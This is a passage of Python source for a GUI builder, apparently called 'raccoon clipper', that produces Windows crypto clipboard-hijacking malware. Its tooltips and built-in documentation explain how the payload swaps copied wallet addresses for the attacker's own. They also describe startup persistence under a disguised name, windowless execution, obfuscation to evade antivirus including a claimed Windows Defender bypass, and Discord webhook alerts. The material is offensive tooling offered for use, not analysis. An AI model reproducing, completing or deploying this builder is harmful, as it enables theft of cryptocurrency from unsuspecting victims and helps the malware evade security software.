        set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                                                btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                                                ltc_addr, sol_addr, doge_addr,
                                                                                                                                                                                bnb_addr, base_addr, ada_addr,
                                                                                                                                                                                dot_addr, xrp_addr, trx_addr,
                                                                                                                                                                                webhook_url))
        set_config_btn.pack(fill="x", padx=10, pady=0)
        config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
        config_set_lbl.pack()

        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file without obfuscating", wraplength=300)
        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", wraplength=300)
        CTkToolTip.CTkToolTip(widget=fix_icons, message="update icons: pressing this restarts explorer.exe making all icons update, this will close all folders open", wraplength=300)
        CTkToolTip.CTkToolTip(widget=ping_discord_checkbox, message="ping discord: if enabled and discord webhook added an @everyone ping will be sent to the webhook", wraplength=300)
        CTkToolTip.CTkToolTip(widget=set_config_btn, message="set config: sets the configuration you chose", wraplength=300)
        CTkToolTip.CTkToolTip(widget=add_icon_btn, message="add icon: sets a custom icon to the .exe - defult is the normal .exe icon. if icons not showing press the fix icons button", wraplength=300)
        CTkToolTip.CTkToolTip(widget=exit, message="exit: exits program", wraplength=300)
        CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
    def main():
        global option_frame, main_frame, root

        root = customtkinter.CTk()
        root.title("raccoon clipper - crypto malware builder")
        root.minsize(width=800, height=400)
        root.geometry("600x475")
        root.resizable(height=False, width=False)
        root.iconbitmap("DefultIcons/racoon.ico")

        hPyT.rainbow_border.start(window=root, interval=5)

        tabview = customtkinter.CTkTabview(master=root)
        tabview.pack(fill="both", expand=True, padx=5, pady=5)
        tabview.add("builder")
        tabview.add("documentation")
        tabview._segmented_button.grid(sticky="w", padx=10)

        option_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        option_frame.pack(side="left", fill="y")
        main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(5, 0))

        docs = customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424")
        docs.pack(fill="both", expand=True)
        customtkinter.CTkLabel(master=docs, text="""What does this program do?
This program is a GUI based malware builder. It allows a user to make a customised piece of malware.

What systems can this malware and builder work on?
The malware and builder will only run on windows computers.

What kind of malware?
The kind of malware is known as crypto clipper malware. The builder allows you to choose a method (ctypes, subprocess, pyperclip).

How does the malware work?
Every 0.25 seconds the malware checks to see if the user has copied any text to the clipboard. If the user has then the text in the clipboard is checked to see if its a bitcoin, ethereum, litecoin or monero address. If it is any of these the clipboard is replaced with the hackers crypto address in turn stealing crypto.

Is the malware detected by antivirus?
All malware types bypass most major antivirus softwares including windows defender as of 4th june 2024 however this could change as time goes on so use virustotal.com to check the .exe file.

Whats the difference between ctypes, subprocess, pyperclip?
ctypes - directly interacts with the clipboard to retrieve text and uses powershell to set the new clipboard text - no installs needed meaning anyone with python installed on a windows computer can run it.
subprocess - uses powershell to retrieve clipboard text and uses powershell to set the new clipboard text - no installs needed meaning anyone with python installed on a windows computer can run it.
pyperclip - uses the pyperclip package to retrieve and set clipboard text - pyperclip install needed meaning this will only work on windows computers with pyperclip installed through pip install pyperclip.

Features:
    -supports bitcoin, ethereum, litecoin, monero.
    -has single use method meaning after one log the code wont run again.
    -duplicates itself to run at startup with a different name.
    -can a add custom icon as .ico file.
    -has an option to obfuscate the .exe but this isnt needed.
    -runs as .pyw file (python windowless) so it runs as background task.
    -if discord webhook added it sends a ping to discord webhook when crypto address detected.
    -creates a readble .pyw as well as the .exe so you can code inspect.

My icons arent showing on the .exe, why is this?
Honestly im not sure why this happens - you can press the fix icons button which will restart windows explorer to update icons - if this doesnt work create an issue on github and try delete IconCashe.db in %localappdata% and restarting computer.""", justify="left", wraplength=750).pack(anchor="w")
        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))

        buildgui.build_widgets()
        if "dont_show_again.txt" not in os.listdir(cwd):
            toplevel.top()

        root.mainloop()
if __name__ == "__main__":
    if os.name == "nt":
        if os.path.exists("output\\dist_obfuscated"):
            pass
        else:
            os.mkdir("output\\dist_obfuscated")
        if os.path.exists("output\\dist_non_obfuscated"):
            pass
        else:
            os.mkdir("output\\dist_non_obfuscated")
        buildgui.main()